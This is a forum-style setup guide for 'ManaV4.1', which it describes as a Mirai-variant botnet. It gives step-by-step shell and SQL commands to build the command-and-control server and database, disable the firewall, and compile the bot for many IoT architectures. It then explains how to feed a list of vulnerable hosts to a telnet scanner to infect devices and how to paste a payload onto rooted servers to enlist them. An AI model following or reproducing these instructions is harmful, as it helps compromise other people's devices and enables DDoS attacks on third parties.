ManaV4.1 Setup Made By @Reborn.Shad0w<3

THIS SETUP GOES WITH THE SOURCE "ManaV4.1"
I UNDERSTAND ITS A SHITTY TOPIC BUT 
I GET ASKED LIKE 3 TIMES A DAY HOW TO DO IT

*****************************
Discord: Reborn.Shad0w#6512
Instagram: @Reborn.Shad0w
Youtube: Reborn. Shad0w
*****************************
______________________________________________________________
         [ What You Need ]
 1. PuTTy
 2. WinSCP & filezilla or mobaXterm  Etc.
3. VPS with CentOS 6.x installed.
 And another VPS for scanning in the future. (to get bots)
4. A fucking basic understanding of botnets
 _____________________________________________________________



Run These Commands
1.
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
===========================================================


2.
mkdir /etc/xcompile
cd /etc/xcompile 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2

tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l

cd /tmp
wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
tar -xzf go1.9.4.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env
cd ~/
=================================================
3.
// Now after that we have to setup the bot.
// Change the other ips with your server IP.

 CHANGE IP(s) IN /stuff/stuff/includes.h -> For example your server ip is 127.0.0.1 the format should be (127.0.0.1)
 CHANGE IP(s) IN /telnet/src/headers/config.h -> For example your server ip is 127.0.0.1 the format should be (127.0.0.1)
 CHANGE IP(s) IN ui/m.h -> make sure the username and the password are "root"
--------------------------------------------------------------
//Now We Just The Ip(s) To You Server We Can Start Database
===============================================================


We will setup the database, run these commands on your terminal:
3.
service mysqld start
mysql_secure_installation
-------------------------
Now Login with your mysql pass by running this command:
==========================

4.
mysql -u root -p
===============

5.
use mysql
GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'MYSQLPASSHERE';
FLUSH PRIVILEGES;

CREATE DATABASE Mana;
use Mana;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'USERNAME', 'PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');

CREATE TABLE `logins` (
  `id` int(11) NOT NULL,
  `username` varchar(32) NOT NULL,
  `action` varchar(32) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
exit;
-----------------------------------------------------------
                                 ^^^^^^^^    ^^^^^^^^
                         PUT YOUR USERNAME AND PASSWORD HERE
 Replace "MYSQLPASSHERE" with your mysql pass you made
Now your database is complete, we will restart and disable services:
===========================================================


5.
service iptables stop 
service httpd restart  
service mysqld restart
-----------------------
Alright, we have to compile the bot and screen the cnc server by doing this:
======================


6.
cd ~/
chmod 0777 * -R
sh build.sh
=================


7.
nano /usr/include/bits/typesizes.h
-----------------------------------
using your down arrow scroll down and edit the 1024 to 999999
THEN SAVE IT CTRL X Y Enter
========================================


8.
screen ./ui
-----------
Screen Should Go Black And Say somthing like this in light purple

                     [ Mana Ouma Bot Mirai Variant ]

Press And Hold CTRL And Press A And Then D

So CTRL+A+D
Screen Should Go Back To How It Was
================================================



Now You Massive Boatnet Is Set Up Time To Use It!!
------------------------------------------------------
To Use The Net Open Putty,

 For "host" | server ip |
 
 Set the cnc "port" as | 1791 |

"Connection Type" | Telnet |

Discord: Reborn.Shad0w#6512
Instagram: @Reborn.Shad0w
Youtube: Reborn. Shad0w


[ Scanning TuT]

0.
drag a vuln list in the "telnet" folder

1.
type the following commands

2.
cd telnet/

3.
ulimit -e999999

4.
cat (Name Of List) | ./telnet


[ Rooting Servers To ManaV4.1 ]

1.
Get A (root access) Vps (Not Being Used)

2.
copy&Paste The Mana Payload

3.
Paste&Enter The Payload Into The Vps


IMPORTANT!!!!!!
After "python ManaPayload.py", when it is finished THERE SHOULD BE SOME TEXT SAYING 
"Your Payload"
 YOU NEED TO COPY THIS TEXT, YOU WILL NEED IT WHEN YOU Root Servers (If You Want)
_______________________________________________________________________________________